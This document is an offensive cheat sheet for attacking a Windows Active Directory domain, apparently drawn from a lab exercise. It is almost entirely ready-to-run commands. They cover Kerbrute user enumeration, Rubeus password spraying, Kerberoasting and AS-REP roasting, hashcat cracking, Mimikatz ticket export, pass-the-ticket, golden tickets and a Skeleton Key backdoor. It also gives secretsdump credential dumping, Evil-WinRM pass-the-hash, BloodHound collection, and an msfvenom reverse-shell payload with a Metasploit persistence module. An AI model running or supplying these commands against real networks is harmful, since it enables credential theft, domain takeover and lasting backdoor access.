Mimikatz

Best fruit for Windows and that dog

Kerbrute Enumerating Rubeus Kerberoasting Rubeus AS-REP Roasting Impacket Kerberoasting Crach Kerbero hash Mimikatz Golden/Silver Ticket Skeleton Key Elevating Privileges Remotely Post-exploit collection Maintain access

Enumerating Users w/ Kerbrute

./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

Harvesting Tickets w/ Rubeus

Rubeus.exe harvest /interval:30

Password-Spraying w/ Rubeus

Rubeus.exe brute /password:Password1 /noticket

Kerberoasting w/ Rubeus

Rubeus.exe kerberoast

AS-REP Roasting w/ Rubeus
(krbasrep5 dump/ w/ Kerberos pre-authentication disabled)

Rubeus.exe asreproast

Kerberoasting w/ Impacket (GetUserSPNs.py)

sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request

Crack the ticket's hash

hashcat -m 13100 -a 0 hash.txt Pass.txt

Pre-start mimikatz
Ensure this outputs [output '20' OK] with admin rights

mimikatz.exe privilege::debug

Export all of the .kirbi tickets w/ mimikatz

sekurlsa::tickets /export

Pass the Ticket w/ Mimikatz

kerberos::ptt {ticket file}

Listing Mimikatz cached tickets
(under user cmd)

klist

Golden/Silver Ticket hash dump w/ Mimikatz

lsadump::lsa /inject /name:{Service account username}

Create a Golden/Silver Ticket

Kerberos::golden /user:{Current Username} /domain:controller.local /sid:{Service User SID} /krbtgt:{NTLM Hash} /id:{User ID}

Use the to access other machines

misc::cmd

Kerberos Backdoors w/ mimikatz (Installing Skeleton Key)
(default credentials will be: "mimikatz")

misc::skeleton

Access Skeletoned Share Drive

net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz

Access Skeletoned Directory

dir \\Desktop-1\c$ /user:Machine1 mimikatz

Elevating Privileges w/ Impacket

./secretsdump.py DOMAIN/{DC_NETBIOS_NAME$ or DOMAIN_USERNAME}@DC_IP_ADDR -just-dc -no-pass

Pass the hash with Evil-WinRM remotely

evil-winrm -i {ip} -u {username} -H {hash}

Post-exploit Powershell startup

powershell -ep bypass

Enumerate users with Powerview.ps1

Get-NetUser | select cn

Enumerate domain groups with Powerview.ps1

Get-NetGroup -GroupName *admin*

Getting loot w/ SharpHound.ps1 to Bloodhound

Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip

Generating Payload w/ msfvenom to maintain access

msfvenom -p windows/meterpreter/reverse_tcp LHOST={Listening Host} LPORT={Listening Port} -f exe -o shell.exe

Create Listener with msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp

Run the Persistence Module with msfconsole

use exploit/windows/local/persistence
set session {msf session number}
